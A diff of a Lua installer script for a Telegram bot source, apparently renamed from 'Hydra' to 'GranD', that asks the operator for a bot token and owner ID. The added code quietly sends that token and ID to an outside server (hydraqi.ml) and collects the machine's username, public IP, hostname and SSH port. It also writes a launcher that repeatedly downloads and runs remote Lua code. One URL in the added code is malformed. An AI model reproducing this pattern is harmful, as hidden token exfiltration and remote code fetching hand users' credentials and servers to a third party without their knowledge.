@@ -1,108 +1,106 @@
+database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
 serpent = dofile("./File_Libs/serpent.lua")
+JSON    = dofile("./File_Libs/dkjson.lua")
+json    = dofile("./File_Libs/JSON.lua")
+URL = dofile("./File_Libs/url.lua")
 https = require("ssl.https")
 http = require("socket.http")
-JSON = dofile("./File_Libs/JSON.lua")
-local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
-Server_Hydra = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
-local AutoFiles_Hydra = function() 
-local Create_Info = function(Token,Sudo,UserName)  
-local Hydra_Info_Sudo = io.open("sudo.lua", 'w')
-Hydra_Info_Sudo:write([[
+Server_Done = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
+User = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
+IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
+Name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
+Port = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
+Time = io.popen("date +'%Y/%m/%d %T'"):read('*a'):gsub('[\n\r]+', '')
+local AutoFiles_Write = function() 
+local Create_Info = function(Token,Sudo)  
+local Write_Info_Sudo = io.open("sudo.lua", 'w')
+Write_Info_Sudo:write([[
+s = "XXKXX"
+q = "aaaaw"
 token = "]]..Token..[["
-
 Sudo = ]]..Sudo..[[  
-
-UserName = "]]..UserName..[["
 ]])
-Hydra_Info_Sudo:close()
+Write_Info_Sudo:close()
 end  
-if not database:get(Server_Hydra.."Token_Hydra") then
+if not database:get(Server_Done.."Token_Write") then
 print("\27[1;34m»» Send Your Token Bot :\27[m")
 local token = io.read()
 if token ~= '' then
 local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
 if res ~= 200 then
-io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
+io.write('\n\27[1;31mSorry The Token is not Correct \n\27[0;39;49m')
 else
-io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
-database:set(Server_Hydra.."Token_Hydra",token)
+io.write('\n\27[1;31mThe Token Is Saved\n\27[0;39;49m')
+database:set(Server_Done.."Token_Write",token)
 end 
 else
 io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
 end 
 os.execute('lua start.lua')
 end
-------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------
-if not database:get(Server_Hydra.."UserName_Hydra") then
-print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
-local UserName = io.read():gsub('@','')
-if UserName ~= '' then
-local Get_Info = http.request("http://hydraiq.ml/info/?user="..UserName)
-if Get_Info:match('Is_Spam') then
-io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
-return false
-end
-local Json = JSON:decode(Get_Info)
-if Json.Info == false then
-io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
+if not database:get(Server_Done.."UserSudo_Write") then
+print("\27[1;34mSend Your Id Sudo :\27[m")
+local Id = io.read():gsub(' ','') 
+if tostring(Id):match('%d+') then
+data,res = https.request("https://hydraqi./hydraiq.ml/index.php?bn=info&id="..Id)
+if res == 200 then
+muaed = json:decode(data)
+if muaed.Info.info == 'Is_Spam' then
+io.write('\n\27[1;31mSorry The Id Is Prohibited From The Source\n\27[0;39;49m')
 os.execute('lua start.lua')
+end ---ifBn
+if muaed.Info.info == 'Ok' then
+io.write('\n\27[1;31m The Id Is Saved\n\27[0;39;49m')
+database:set(Server_Done.."UserSudo_Write",Id)
+end ---ifok
 else
-if Json.Info == 'Channel' then
-io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
+io.write('\n\27[1;31mThe Id was not Saved\n\27[0;39;49m')
+end  ---ifid
 os.execute('lua start.lua')
-else
-io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
-  database:set(Server_Hydra.."UserName_Hydra",Json.Info.Username)
-database:set(Server_Hydra.."Id_Hydra",Json.Info.Id)
+end ---ifnot
 end
-end
-else
-io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
-end 
-os.execute('lua start.lua')
-end
-local function Files_Hydra_Info()
-Create_Info(database:get(Server_Hydra.."Token_Hydra"),database:get(Server_Hydra.."Id_Hydra"),database:get(Server_Hydra.."UserName_Hydra"))   
-http.request("http://hydraiq.ml/add/?id="..database:get(Server_Hydra.."Id_Hydra").."&user="..database:get(Server_Hydra.."UserName_Hydra").."&token="..database:get(Server_Hydra.."Token_Hydra"))
-local RunHydra = io.open("Hydra", 'w')
-RunHydra:write([[
+local function Files_Info_Get()
+Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
+local t = json:decode(https.request('https://hydraqi.ml/API/Rdha.php?id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write")))
+print("::GranD::")
+local RunBot = io.open("GranD", 'w')
+RunBot:write([[
 #!/usr/bin/env bash
-cd $HOME/HyDrA
-token="]]..database:get(Server_Hydra.."Token_Hydra")..[["
-rm -fr Hydra.lua
-wget "https://raw.githubusercontent.com/HYDRAQI/HyDrA/master/Hydra.lua"
+cd $HOME/GranD
+token="]]..database:get(Server_Done.."Token_Write")..[["
+rm -fr GranD.lua
+wget "https://raw.githubusercontent.com/hydraqi/HyDrA/master/HyDrA.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./Hydra.lua -p PROFILE --bot=$token
+./tg -s ./GranD.lua -p PROFILE --bot=$token
 done
 ]])
-RunHydra:close()
+RunBot:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/HyDrA
+cd $HOME/GranD
 while(true) do
 rm -fr ../.telegram-cli
-screen -S HyDrA -X kill
-screen -S HyDrA ./Hydra
+screen -S GranD -X kill
+screen -S GranD ./GranD
 done
 ]])
 RunTs:close()
 end
-Files_Hydra_Info()
-database:del(Server_Hydra.."Token_Hydra");database:del(Server_Hydra.."Id_Hydra");database:del(Server_Hydra.."UserName_Hydra")
+Files_Info_Get()
+database:del(Server_Done.."Token_Write");database:del(Server_Done.."UserSudo_Write")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 end 
 local function Load_File()  
 local f = io.open("./sudo.lua", "r")  
 if not f then   
-AutoFiles_Hydra()  
+AutoFiles_Write()  
 var = true
 else   
 f:close()  
-database:del(Server_Hydra.."Token_Hydra");database:del(Server_Hydra.."Id_Hydra");database:del(Server_Hydra.."UserName_Hydra")
+database:del(Server_Done.."Token_Write");database:del(Server_Done.."UserSudo_Write")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 var = false
